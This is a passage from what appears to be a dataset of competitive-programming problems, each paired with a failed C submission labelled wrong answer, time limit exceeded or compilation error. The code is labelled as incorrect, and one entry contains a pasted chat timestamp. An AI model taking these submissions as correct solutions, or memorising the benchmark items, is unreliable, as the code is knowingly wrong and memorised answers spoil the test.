the secret super weapon. Due to high seismic activity and poor weather conditions the satellites haven't yet been able to make clear shots of the monster. The analysis of the first shot resulted in an undirected graph with n vertices and m edges. Now the world's best minds are about to determine whether this graph can be regarded as Cthulhu or not.To add simplicity, let's suppose that Cthulhu looks from the space like some spherical body with tentacles attached to it. Formally, we shall regard as Cthulhu such an undirected graph that can be represented as a set of three or more rooted trees, whose roots are connected by a simple cycle.It is guaranteed that the graph contains no multiple edges and self-loops.  ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers \u2014 the number of vertices n and the number of edges m of the graph (1\u2009\u2264\u2009n\u2009\u2264\u2009100, 0\u2009\u2264\u2009m\u2009\u2264\u2009). Each of the following m lines contains a pair of integers x and y, that show that an edge exists between vertices x and y (1\u2009\u2264\u2009x,\u2009y\u2009\u2264\u2009n,\u2009x\u2009\u2260\u2009y). For each pair of vertices there will be at most one edge between them, no edge connects a vertex to itself.","output_spec":"Print \"NO\", if the graph is not Cthulhu and \"FHTAGN!\" if it is.","notes":"NoteLet us denote as a simple cycle a set of v vertices that can be numbered so that the edges will only exist between vertices number 1 and 2, 2 and 3, ..., v\u2009-\u20091 and v, v and 1.A tree is a connected undirected graph consisting of n vertices and n\u2009-\u20091 edges (n\u2009&gt;\u20090).A rooted tree is a tree where one vertex is selected to be the root.","sample_inputs":["6 6\n6 3\n6 4\n5 1\n2 5\n1 4\n5 4","6 5\n5 6\n4 6\n3 1\n5 1\n1 2"],"sample_outputs":["FHTAGN!","NO"]}
{"difficulty":1100,"lang":"GNU C11","lang_cluster":"c","src_uid":"5d11fa8528f1dc873d50b3417bef8c79","submission_id":"re_1004","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n\nint main()\n{\n    int i,j,n;\n    int max=0,a=0,k;\n    scanf(\"%d\",&n);\n    \n    int arr[n],arr1[n];\n    for(i=0;i<n;i++)\n        scanf(\"%d\",&arr[i]);\n    if(n==1)\n        printf(\"%d\",n);\n    else\n    {\n    for(i=0;i<n;i++)\n    {\n        if(max<a)\n            max=a;\n        a=0;\n        for(k=i;k>=0;k--)  \/\/before\n        {\n            if(arr[k]>=arr[k-1])\n            {\n                ++a;\n            }\n            else\n                break;\n        }\n        for(j=i;j<n;j++)  \/\/after\n        {\n            if(arr[j]>=arr[j+1])\n                ++a;\n                else\n                    break;\n        }\n    }\n    printf(\"%d\",max+1);\n    }\n \nreturn 0;   \n}","description":"Little Petya often travels to his grandmother in the countryside. The grandmother has a large garden, which can be represented as a rectangle 1\u2009\u00d7\u2009n in size, when viewed from above. This rectangle is divided into n equal square sections. The garden is very unusual as each of the square sections possesses its own fixed height and due to the newest irrigation system we can create artificial rain above each section.Creating artificial rain is an expensive operation. That's why we limit ourselves to creating the artificial rain only above one section. At that, the water from each watered section will flow into its neighbouring sections if their height does not exceed the height of the section. That is, for example, the garden can be represented by a 1\u2009\u00d7\u20095 rectangle, where the section heights are equal to 4, 2, 3, 3, 2. Then if we create an artificial rain over any of the sections with the height of 3, the water will flow over all the sections, except the ones with the height of 4. See the illustration of this example at the picture:  As Petya is keen on programming, he decided to find such a section that if we create artificial rain above it, the number of watered sections will be maximal. Help him. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000). The second line contains n positive integers which are the height of the sections. All the numbers are no less than 1 and not more than 1000.","output_spec":"Print a single number, the maximal number of watered sections if we create artificial rain above exactly one section.","notes":null,"sample_inputs":["1\n2","5\n1 2 1 2 1","8\n1 2 1 1 1 3 3 4"],"sample_outputs":["1","3","6"]}
{"difficulty":1500,"lang":"GNU C","lang_cluster":"c","src_uid":"5e055bad1da5bdc84599d6f2f89fbd12","submission_id":"re_1253","tags":["data structures","binary search"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n#define M  100000\nstruct card{\n       int f;\n       int b;\n       int g; \n       }card[M];\nstruct color{\n       int c;\n       int num;\n       int same;\n       }front[M];\nstruct color1{\n       int c;\n       int num;\n       }back[M];   \nint cmp1(const void *a,const void *b){\n    struct card *c=(struct card *)a;\n    struct card *d=(struct card *)b;\n    return c->f-d->f;\n}\nint cmp2(const void *a,const void *b){\n    struct card *c=(struct card *)a;\n    struct card *d=(struct card *)b;\n    return c->b-d->b;\n}\nint cmp3(const void *a,const void *b){\n    struct color *c=(struct color *)a;\n    struct color *d=(struct color *)b;\n    return d->num-c->num;\n}\nint main(){\n    int N,i,j,t,k,fnum,bnum,move,min,same,count;\n    while(scanf(\"%d\",&N),N){\n        memset(card,0,sizeof(card));\n        memset(front,0,sizeof(front));\n        memset(back,0,sizeof(back));\n        for(i=0;i<N;i++){\n            scanf(\"%d %d\",&card[i].f,&card[i].b);\n            if(card[i].f==card[i].b)card[i].g=1;\n            else card[i].g=0;\n        }\n        qsort(card,N,sizeof(card[0]),cmp1); \n        t=1;j=0;\n        for(i=1;i<N;i++)\n            if(card[i].f==card[i-1].f) t++;\n            else {\n                front[j].c=card[i-1].f;\n                front[j].num=t;\n                same=0;\n                for(k=i-t;k<i;k++){if(card[k].g==1)same++;}\n                front[j++].same=same;\n                t=1;\n            }\n        front[j].c=card[i-1].f;front[j].num=t;\n        fnum=j+1;\n        qsort(card,N,sizeof(card[0]),cmp2);\n        t=1;j=0;\n        for(i=1;i<N;i++)\n            if(card[i].b==card[i-1].b)   t++;\n            else {\n                back[j].c=card[i-1].b;\n                back[j++].num=t;\n                t=1;\n            }\n        back[j].c=card[i].b;back[j].num=t;\n        bnum=j+1;\n        qsort(front,fnum,sizeof(front[0]),cmp3);\n        min=N;move=N;\n        for(i=0;i<fnum;i++){\n            if(front[i].num>=(N+1)\/2){ move=0;break;}\n            else{\n                for(j=0;j<bnum;j++)\n                    if(back[j].c==front[i].c){\n                        count=back[j].num+front[i].num-front[i].same;\n                        if(count>=(N+1)\/2)move=back[j].num-front[i].same;\n                        if(move<min)min=move;\n                        break;\n                    }\n            }\n        }\n        if(move==0)printf(\"%d\\n\",move);\n        else if(move==N)printf(\"-1\\n\");\n        else printf(\"%d\\n\",min);\n    }\n    return 0;\n}\n","description":"The Little Elephant loves to play with color cards.He has n cards, each has exactly two colors (the color of the front side and the color of the back side). Initially, all the cards lay on the table with the front side up. In one move the Little Elephant can turn any card to the other side. The Little Elephant thinks that a set of cards on the table is funny if at least half of the cards have the same color (for each card the color of the upper side is considered).Help the Little Elephant to find the minimum number of moves needed to make the set of n cards funny.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of the cards. The following n lines contain the description of all cards, one card per line. The cards are described by a pair of positive integers not exceeding 109 \u2014 colors of both sides. The first number in a line is the color of the front of the card, the second one \u2014 of the back. The color of the front of the card may coincide with the color of the back of the card. The numbers in the lines are separated by single spaces.","output_spec":"On a single line print a single integer \u2014 the sought minimum number of moves. If it is impossible to make the set funny, print -1.","notes":"NoteIn the first sample there initially are three cards lying with colors 4, 4, 7. Since two of the three cards are of the same color 4, you do not need to change anything, so the answer is 0.In the second sample, you can turn the first and the fourth cards. After that three of the five cards will be of color 7.","sample_inputs":["3\n4 7\n4 7\n7 4","5\n4 7\n7 4\n2 11\n9 7\n1 1"],"sample_outputs":["0","2"]}
{"difficulty":1100,"lang":"GNU C","lang_cluster":"c","src_uid":"65fea461d3caa5a932d1e2c13e99a59e","submission_id":"re_105","tags":["math"],"exec_outcome":"COMPILATION_ERROR","source_code":"#\n","description":"A group of n merry programmers celebrate Robert Floyd's birthday. Polucarpus has got an honourable task of pouring Ber-Cola to everybody. Pouring the same amount of Ber-Cola to everybody is really important. In other words, the drink's volume in each of the n mugs must be the same.Polycarpus has already began the process and he partially emptied the Ber-Cola bottle. Now the first mug has a1 milliliters of the drink, the second one has a2 milliliters and so on. The bottle has b milliliters left and Polycarpus plans to pour them into the mugs so that the main equation was fulfilled.Write a program that would determine what volume of the drink Polycarpus needs to add into each mug to ensure that the following two conditions were fulfilled simultaneously:   there were b milliliters poured in total. That is, the bottle need to be emptied;  after the process is over, the volumes of the drink in the mugs should be equal. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n, b (2\u2009\u2264\u2009n\u2009\u2264\u2009100,\u20091\u2009\u2264\u2009b\u2009\u2264\u2009100), where n is the total number of friends in the group and b is the current volume of drink in the bottle. The second line contains a sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u2009100), where ai is the current volume of drink in the i-th mug.","output_spec":"Print a single number \"-1\" (without the quotes), if there is no solution. Otherwise, print n float numbers c1,\u2009c2,\u2009...,\u2009cn, where ci is the volume of the drink to add in the i-th mug. Print the numbers with no less than 6 digits after the decimal point, print each ci on a single line. Polycarpus proved that if a solution exists then it is unique. Russian locale is installed by default on the testing computer. Make sure that your solution use the point to separate the integer part of a real number from the decimal, not a comma.","notes":null,"sample_inputs":["5 50\n1 2 3 4 5","2 2\n1 100"],"sample_outputs":["12.000000\n11.000000\n10.000000\n9.000000\n8.000000","-1"]}
{"difficulty":800,"lang":"GNU C","lang_cluster":"c","src_uid":"69850c2af99d60711bcff5870575e15e","submission_id":"re_987","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\nint main()\n{\nint n,i,a,b,sum=0;\nscanf(\"%d\",&n);\nint ar[n-1];\nfor(i=0;i<n-1;i++)\n{\n    scanf(\"%d\",&ar[i]);\n}\nscanf(\"%d%d\",&a,&b);\nif(b-a==1){\n\n    printf(\"%d\",ar[a-1]);\n    return 0;\n}\nelse{\nfor(i=a-1;i<b-a;i++)\n    sum+=ar[i];\n    printf(\"%d\",sum);\n    return 0;\n}\n}\n","description":"The Berland Armed Forces System consists of n ranks that are numbered using natural numbers from 1 to n, where 1 is the lowest rank and n is the highest rank.One needs exactly di years to rise from rank i to rank i\u2009+\u20091. Reaching a certain rank i having not reached all the previous i\u2009-\u20091 ranks is impossible.Vasya has just reached a new rank of a, but he dreams of holding the rank of b. Find for how many more years Vasya should serve in the army until he can finally realize his dream.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100). The second line contains n\u2009-\u20091 integers di (1\u2009\u2264\u2009di\u2009\u2264\u2009100). The third input line contains two integers a and b (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009\u2264\u2009n). The numbers on the lines are space-separated.","output_spec":"Print the single number which is the number of years that Vasya needs to rise from rank a to rank b.","notes":null,"sample_inputs":["3\n5 6\n1 2","3\n5 6\n1 3"],"sample_outputs":["5","11"]}
{"difficulty":1300,"lang":"GNU C","lang_cluster":"c","src_uid":"6cfd3b0a403212ec68bac1667bce9ef1","submission_id":"re_722","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\nint a[1000008]={0};\nint main(){\n\tint n,i,s=0,ma=0,temp;\n\tchar b[10];\n\tscanf(\"%d\",&n);\n\tfor(i=0;i<n;i++){\n\t\tscanf(\"%s %d\",b,&temp);\n\t\tif(b[0]=='+'){\n\t\t\ta[temp]++;\n\t\t\ts++;\n\t\t}\n\t\telse{\n\t\t\tif(a[temp]==0){\n\t\t\t\tma++;\n\t\t\t}\n\t\t\telse{\n\t\t\t\ta[temp]--;\n\t\t\t\ts--;\n\t\t\t}\n\t\t}\n\t\tma=ma>s?ma:s;\n\t}\n\tprintf(\"%d\\n\",ma);\n\n}\n","description":"Berland National Library has recently been built in the capital of Berland. In addition, in the library you can take any of the collected works of Berland leaders, the library has a reading room.Today was the pilot launch of an automated reading room visitors' accounting system! The scanner of the system is installed at the entrance to the reading room. It records the events of the form \"reader entered room\", \"reader left room\". Every reader is assigned a registration number during the registration procedure at the library \u2014 it's a unique integer from 1 to 106. Thus, the system logs events of two forms:  \"+ ri\" \u2014 the reader with registration number ri entered the room;  \"- ri\" \u2014 the reader with registration number ri left the room. The first launch of the system was a success, it functioned for some period of time, and, at the time of its launch and at the time of its shutdown, the reading room may already have visitors.Significant funds of the budget of Berland have been spent on the design and installation of the system. Therefore, some of the citizens of the capital now demand to explain the need for this system and the benefits that its implementation will bring. Now, the developers of the system need to urgently come up with reasons for its existence.Help the system developers to find the minimum possible capacity of the reading room (in visitors) using the log of the system available to you.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of records in the system log. Next follow n events from the system journal in the order in which the were made. Each event was written on a single line and looks as \"+ ri\" or \"- ri\", where ri is an integer from 1 to 106, the registration number of the visitor (that is, distinct visitors always have distinct registration numbers). It is guaranteed that the log is not contradictory, that is, for every visitor the types of any of his two consecutive events are distinct. Before starting the system, and after stopping the room may possibly contain visitors.","output_spec":"Print a single integer \u2014 the minimum possible capacity of the reading room.","notes":"NoteIn the first sample test, the system log will ensure that at some point in the reading room were visitors with registration numbers 1, 1200 and 12001. More people were not in the room at the same time based on the log. Therefore, the answer to the test is 3.","sample_inputs":["6\n+ 12001\n- 12001\n- 1\n- 1200\n+ 1\n+ 7","2\n- 1\n- 2","2\n+ 1\n- 1"],"sample_outputs":["3","2","1"]}
{"difficulty":1000,"lang":"GNU C","lang_cluster":"c","src_uid":"6e0dafeaf85e92f959c388c72e158f68","submission_id":"re_412","tags":["constructive algorithms","*special"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\nint main() {\n\tint a, b, n,i, j, c;\n\n\tfreopen(\"input.txt\", \"r\", stdin);\n\tscanf(\"%d %d %d\",&n, &a, &b);\n\tif (a * b < n) {\n\t\tprintf(\"-1\"); return 0;\n\t}\n\tfor (i = 0; i < a; i++) {\n\t\tfor (j = 0; j < b; j++) {\n\t\t\tif (i & 1) c = (i + 1)*b - j;\n\t\t\telse c = i * b + j + 1;\n\t\t\tif (c > n) printf(\"0 \");\n\t\t\telse printf(\"%d \", c);\n\t\t}\n\t\tputchar('\\n');\n\t}\n\treturn 0;\n}","description":"There are n parliamentarians in Berland. They are numbered with integers from 1 to n. It happened that all parliamentarians with odd indices are Democrats and all parliamentarians with even indices are Republicans.New parliament assembly hall is a rectangle consisting of a\u2009\u00d7\u2009b chairs\u00a0\u2014 a rows of b chairs each. Two chairs are considered neighbouring if they share as side. For example, chair number 5 in row number 2 is neighbouring to chairs number 4 and 6 in this row and chairs with number 5 in rows 1 and 3. Thus, chairs have four neighbours in general, except for the chairs on the border of the hallWe know that if two parliamentarians from one political party (that is two Democrats or two Republicans) seat nearby they spent all time discussing internal party issues.Write the program that given the number of parliamentarians and the sizes of the hall determine if there is a way to find a seat for any parliamentarian, such that no two members of the same party share neighbouring seats.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n, a and b (1\u2009\u2264\u2009n\u2009\u2264\u200910\u2009000, 1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009100)\u00a0\u2014 the number of parliamentarians, the number of rows in the assembly hall and the number of seats in each row, respectively.","output_spec":"If there is no way to assigns seats to parliamentarians in a proper way print -1. Otherwise print the solution in a lines, each containing b integers. The j-th integer of the i-th line should be equal to the index of parliamentarian occupying this seat, or 0 if this seat should remain empty. If there are multiple possible solution, you may print any of them.","notes":"NoteIn the first sample there are many other possible solutions. For example, 3 20 1and 2 13 0The following assignment 3 21 0is incorrect, because parliamentarians 1 and 3 are both from Democrats party but will occupy neighbouring seats.","sample_inputs":["3 2 2","8 4 3","10 2 2"],"sample_outputs":["0 3\n1 2","7 8 3\n0 1 4\n6 0 5\n0 2 0","-1"]}
{"difficulty":1100,"lang":"GNU C11","lang_cluster":"c","src_uid":"6f6859aabc1c9cbb9ee0d910064d87c2","submission_id":"re_840","tags":["implementation"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nvoid main()\n{\n    int i,n,N;\n    char chaine[101];\n    int len =0;\n    scanf(\"%d\",&n);\n    while(len!=n)\n    {\n        scanf(\"%d\",&N);\n        sprintf(chaine,\"%d\",N);\n        len =strlen(chaine);\n    }\n    if ((len%2)!=0)\n    {\n        for(i=0;i<(len-3);i=i+2)\n        {\n           printf(\"%c%c-\",chaine[i],chaine[i+1]);\n        }\n        printf(\"%c%c%c\",chaine[len-3],chaine[len-2],chaine[len-1]);\n    }\n    else\n    {\n        for(i=0;i<(len-2);i=i+2)\n        {\n            printf(\"%c%c-\",chaine[i],chaine[i+1]);\n        }\n        printf(\"%c%c\",chaine[len-2],chaine[len-1]);\n    }\n}\n","description":"Phone number in Berland is a sequence of n digits. Often, to make it easier to memorize the number, it is divided into groups of two or three digits. For example, the phone number 1198733 is easier to remember as 11-987-33. Your task is to find for a given phone number any of its divisions into groups of two or three digits.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of digits in the phone number. The second line contains n digits \u2014 the phone number to divide into groups.","output_spec":"Output any of divisions of the given phone number into groups of two or three digits. Separate groups by single character -. If the answer is not unique, output any.","notes":null,"sample_inputs":["6\n549871","7\n1198733"],"sample_outputs":["54-98-71","11-987-33"]}
{"difficulty":800,"lang":"GNU C11","lang_cluster":"c","src_uid":"7170c40405cf7a5e0f2bd15e4c7d189d","submission_id":"re_916","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n\nint main()\n{\n    int n;\n    scanf(\"%d\", &n);\n    int t=1, k=1;\n    while(k<n)\n    {\n        t = (t+k)%n;\n        printf(\"%d \", t);\n        k++;\n    }\n    return 0;\n}\n","description":"A kindergarten teacher Natalia Pavlovna has invented a new ball game. This game not only develops the children's physique, but also teaches them how to count. The game goes as follows. Kids stand in circle. Let's agree to think of the children as numbered with numbers from 1 to n clockwise and the child number 1 is holding the ball. First the first child throws the ball to the next one clockwise, i.e. to the child number 2. Then the child number 2 throws the ball to the next but one child, i.e. to the child number 4, then the fourth child throws the ball to the child that stands two children away from him, i.e. to the child number 7, then the ball is thrown to the child who stands 3 children away from the child number 7, then the ball is thrown to the child who stands 4 children away from the last one, and so on. It should be mentioned that when a ball is thrown it may pass the beginning of the circle. For example, if n\u2009=\u20095, then after the third throw the child number 2 has the ball again. Overall, n\u2009-\u20091 throws are made, and the game ends.The problem is that not all the children get the ball during the game. If a child doesn't get the ball, he gets very upset and cries until Natalia Pavlovna gives him a candy. That's why Natalia Pavlovna asks you to help her to identify the numbers of the children who will get the ball after each throw.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which indicates the number of kids in the circle.","output_spec":"In the single line print n\u2009-\u20091 numbers which are the numbers of children who will get the ball after each throw. Separate the numbers by spaces.","notes":null,"sample_inputs":["10","3"],"sample_outputs":["2 4 7 1 6 2 9 7 6","2 1"]}
{"difficulty":1300,"lang":"GNU C","lang_cluster":"c","src_uid":"782b819eb0bfc86d6f96f15ac09d5085","submission_id":"re_811","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\nlong long int p(long long int a)\n{\n    long long int t;\n    if(a==1)\n    return(2);\n    if(a%2==0)\n    {\n              t=((p(a\/2)%1000000007)*(p(a\/2)%1000000007))%1000000007;\n              return(t);\n    }\n    else\n    {\n        t=(2*(p((a-1)\/2)%1000000007)*(p((a-1)\/2)%1000000007))%1000000007;\n        return(t);\n    }\n}\nint main()\n{\n    long long int n;\n    scanf(\"%I64d\",&n);\n    printf(\"%I64d\",(p(n)*(p(n)+1))\/2);\n    return 0;\n}\n    \n","description":"Dwarfs have planted a very interesting plant, which is a triangle directed \"upwards\". This plant has an amusing feature. After one year a triangle plant directed \"upwards\" divides into four triangle plants: three of them will point \"upwards\" and one will point \"downwards\". After another year, each triangle plant divides into four triangle plants: three of them will be directed in the same direction as the parent plant, and one of them will be directed in the opposite direction. Then each year the process repeats. The figure below illustrates this process.  Help the dwarfs find out how many triangle plants that point \"upwards\" will be in n years.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (0\u2009\u2264\u2009n\u2009\u2264\u20091018) \u2014 the number of full years when the plant grew. Please do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"Print a single integer \u2014 the remainder of dividing the number of plants that will point \"upwards\" in n years by 1000000007 (109\u2009+\u20097).","notes":"NoteThe first test sample corresponds to the second triangle on the figure in the statement. The second test sample corresponds to the third one.","sample_inputs":["1","2"],"sample_outputs":["3","10"]}
{"difficulty":1300,"lang":"GNU C","lang_cluster":"c","src_uid":"88d56c1e3a7ffa94354ce0c70d8e958f","submission_id":"re_75","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\nint main()\n{\n\t\n\n\tint type,hr,min,i;\n\n\tscanf(\"%d\",&type);\n\tscanf(\"%02d:%02d\",&hr,&min);\n\tif(hr==0)\n\t\thr=1;\n\n\t if(min==60)\n\t\t min=0;\n\t\t else if(min>60)\n\t\tmin=min%10;\n\tif(type==12)\n\t{\n\t\tif(hr>12)\n\t\t\thr=hr%10;\n\t\tif(hr==0)\n\t\t\thr=10;\n\t}\n\t\telse\n\t\t{\n\t\t\tif(hr>23)\n\t\t\t\thr=hr%10;\n\t\t\t}\t\n\t\t\n\tprintf(\"%02d:%02d\",hr,min);\n\t\t\t\treturn 0;\n}\n","description":"You are given a broken clock. You know, that it is supposed to show time in 12- or 24-hours HH:MM format. In 12-hours format hours change from 1 to 12, while in 24-hours it changes from 0 to 23. In both formats minutes change from 0 to 59.You are given a time in format HH:MM that is currently displayed on the broken clock. Your goal is to change minimum number of digits in order to make clocks display the correct time in the given format.For example, if 00:99 is displayed, it is enough to replace the second 9 with 3 in order to get 00:39 that is a correct time in 24-hours format. However, to make 00:99 correct in 12-hours format, one has to change at least two digits. Additionally to the first change one can replace the second 0 with 1 and obtain 01:39.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer 12 or 24, that denote 12-hours or 24-hours format respectively. The second line contains the time in format HH:MM, that is currently displayed on the clock. First two characters stand for the hours, while next two show the minutes.","output_spec":"The only line of the output should contain the time in format HH:MM that is a correct time in the given format. It should differ from the original in as few positions as possible. If there are many optimal solutions you can print any of them.","notes":null,"sample_inputs":["24\n17:30","12\n17:30","24\n99:99"],"sample_outputs":["17:30","07:30","09:09"]}
{"difficulty":1400,"lang":"GNU C11","lang_cluster":"c","src_uid":"8a9adc116abbd387a6a64dd754436f8a","submission_id":"re_450","tags":["brute force","math"],"exec_outcome":"COMPILATION_ERROR","source_code":"#include<stdio.h>\n#include<math.h>\nint main()\n{\n    long long int a,b,n,i,t=0,c,d;\n    scanf(\"%I64d %I64d %I64d\",&a,&b,&n);\n    for(i=1;i<=10;i++){\n        c=a*pow(i,n);\n        d=a*pow(-i,n);\n        if(c==b){\n            t=i;\n            break;\n        }\n        else if(d==b){\n            t=-i;\n            break;\n        }\n    }\n    if(t==0){\n        printf(\"No solution\\n\");\n    }\n    else{\n        printf(\"%I64d\\n\",t);\n    }\n    return 0;\n}\n","description":"A long time ago in some far country lived king Copa. After the recent king's reform, he got so large powers that started to keep the books by himself.The total income A of his kingdom during 0-th year is known, as well as the total income B during n-th year (these numbers can be negative \u2014 it means that there was a loss in the correspondent year). King wants to show financial stability. To do this, he needs to find common coefficient X \u2014 the coefficient of income growth during one year. This coefficient should satisfy the equation:A\u00b7Xn\u2009=\u2009B.Surely, the king is not going to do this job by himself, and demands you to find such number X.It is necessary to point out that the fractional numbers are not used in kingdom's economy. That's why all input numbers as well as coefficient X must be integers. The number X may be zero or negative.","input_from":"standard input","output_to":"standard output","input_spec":"The input contains three integers A, B, n (|A|,\u2009|B|\u2009\u2264\u20091000, 1\u2009\u2264\u2009n\u2009\u2264\u200910).","output_spec":"Output the required integer coefficient X, or \u00abNo solution\u00bb, if such a coefficient does not exist or it is fractional. If there are several possible solutions, output any of them.","notes":null,"sample_inputs":["2 18 2","-1 8 3","0 0 10","1 16 5"],"sample_outputs":["3","-2","5","No solution"]}
{"difficulty":1500,"lang":"GNU C","lang_cluster":"c","src_uid":"9642368dc4ffe2fc6fe6438c7406c1bd","submission_id":"re_1444","tags":["dp","combinatorics","math","binary search","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"\n#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n#define SORT(a,n) qsort(a,n,sizeof(int),intcmp)\n#define s(n)                        scanf(\"%d\",&n)\n#define sc(n)                       scanf(\"%c\",&n)\n#define sl(n)                       scanf(\"%I64d\",&n)\n#define sf(n)                       scanf(\"%lf\",&n)\n#define ss(n)                       scanf(\"%s\",n)\n#define fiI64(a,v)                   memset(a, v, sizeof a)\nint intcmp(const void *f,const void *s)\n{\n   return (*(int *)f-*(int *)s);\n}\nint gcd(int a,int b){ return ((b==0)?a:gcd(b,a%b));}\n\n#define MAX 100\n#define MODBY 1000000007\n\ntypedef long long int I64d;\ntypedef long double Lf;\nI64d table[20][10];\nint checkspl(I64d a)\n{\n   int last=a%10,first=a%10;\n   while(a){\n      first=a%10;\n      a\/=10;\n   }\n   return (first==last);\n}\nvoid preprocess()\n{\n   int i,j;\n   for(i=1;i<10;++i){ table[0][i]=0;\n      table[1][i]=table[2][i]=1;\n   }\n   int s=10;\n   for(i=3;i<20;++i,s*=10)\n      for(j=1;j<10;++j)\n         table[i][j]=s;\n}\nI64d myatoi(char *s,int from,int tiI64)\n{\n   I64d ans=0;\n   int i;\n   for(i=from;i<=tiI64;++i)\n      ans=ans*10+(s[i]-'0');\n   return ans;\n}\nI64d count(char *s)\n{\n   int len=strlen(s),i,j;\n   I64d ans=0;\n   if(len==1) return *s-'0';\n\n   ans=1+myatoi(s,1,len-2);\n\n   for(j=1;j<len;++j)\n      for(i=1;i<10;++i)\n         ans+=table[j][i];\n   for(i=1;i<s[0]-'0';++i)\n      ans+=table[len][i];\n   return ans;\n}\nint main()\n{\n   char a[MAX],b[MAX];\n   I64d aint,bint;\n   preprocess();\n   sl(aint);aint--;\n   while(!checkspl(aint)) aint--;\n   sl(bint);\n   while(!checkspl(bint)) bint--;\n   sprintf(a,\"%I64d\",aint);\n   sprintf(b,\"%I64d\",bint);\n   printf(\"%I64d\\n\",count(b)-count(a));\n   return 0;\n}\n","description":"The Little Elephant very much loves sums on intervals.This time he has a pair of integers l and r (l\u2009\u2264\u2009r). The Little Elephant has to find the number of such integers x (l\u2009\u2264\u2009x\u2009\u2264\u2009r), that the first digit of integer x equals the last one (in decimal notation). For example, such numbers as 101, 477474 or 9 will be included in the answer and 47, 253 or 1020 will not.Help him and count the number of described numbers x for a given pair l and r.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains a pair of integers l and r (1\u2009\u2264\u2009l\u2009\u2264\u2009r\u2009\u2264\u20091018) \u2014 the boundaries of the interval. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"On a single line print a single integer \u2014 the answer to the problem.","notes":"NoteIn the first sample the answer includes integers 2, 3, 4, 5, 6, 7, 8, 9, 11, 22, 33, 44. ","sample_inputs":["2 47","47 1024"],"sample_outputs":["12","98"]}
{"difficulty":1400,"lang":"GNU C11","lang_cluster":"c","src_uid":"991516fa6f3ed5a71c547a3a50ea1a2b","submission_id":"re_1046","tags":["brute force"],"exec_outcome":"COMPILATION_ERROR","source_code":"[12:43 p.\u00a0m., 8\/10\/2019] Adri: #include<stdio.h>\n\nint main() {\n\tint n,m,l;\n\tint a[100],am=0,suma;\n\t\n\t\tscanf(\"%d%d\",&n,&l);\n\t\n\t\t\tfor(int i=0;i<n;i++)\n\t\t\t\tscanf(\"%d\",&a[i]);\n\t\t\t\t\n\t\t\tfor(int i=l;i<=100;i++) {\n\t\t\t\tsuma = 0;\n\t\t\n\t\t\t\tfor(int j=0;j<n;j++)\n\t\t\t\t\tsuma += (a[j]\/i)*i;\n\t\t\t\tif(suma>am)\n\t\t\t\t\tam = suma;\n\t\t\t}\n\t\n\tprintf(\"%d\\n\",am);\n\treturn 0;\n}","description":"The blinds are known to consist of opaque horizontal stripes that can be rotated thus regulating the amount of light flowing in the room. There are n blind stripes with the width of 1 in the factory warehouse for blind production. The problem is that all of them are spare details from different orders, that is, they may not have the same length (it is even possible for them to have different lengths)Every stripe can be cut into two or more parts. The cuttings are made perpendicularly to the side along which the length is measured. Thus the cuttings do not change the width of a stripe but each of the resulting pieces has a lesser length (the sum of which is equal to the length of the initial stripe)After all the cuttings the blinds are constructed through consecutive joining of several parts, similar in length, along sides, along which length is measured. Also, apart from the resulting pieces an initial stripe can be used as a blind if it hasn't been cut. It is forbidden to construct blinds in any other way.Thus, if the blinds consist of k pieces each d in length, then they are of form of a rectangle of k\u2009\u00d7\u2009d bourlemeters. Your task is to find for what window possessing the largest possible area the blinds can be made from the given stripes if on technical grounds it is forbidden to use pieces shorter than l bourlemeter. The window is of form of a rectangle with side lengths as positive integers.","input_from":"standard input","output_to":"standard output","input_spec":"The first output line contains two space-separated integers n and l (1\u2009\u2264\u2009n,\u2009l\u2009\u2264\u2009100). They are the number of stripes in the warehouse and the minimal acceptable length of a blind stripe in bourlemeters. The second line contains space-separated n integers ai. They are the lengths of initial stripes in bourlemeters (1\u2009\u2264\u2009ai\u2009\u2264\u2009100).","output_spec":"Print the single number \u2014 the maximal area of the window in square bourlemeters that can be completely covered. If no window with a positive area that can be covered completely without breaking any of the given rules exist, then print the single number 0.","notes":"NoteIn the first sample test the required window is 2\u2009\u00d7\u20094 in size and the blinds for it consist of 4 parts, each 2 bourlemeters long. One of the parts 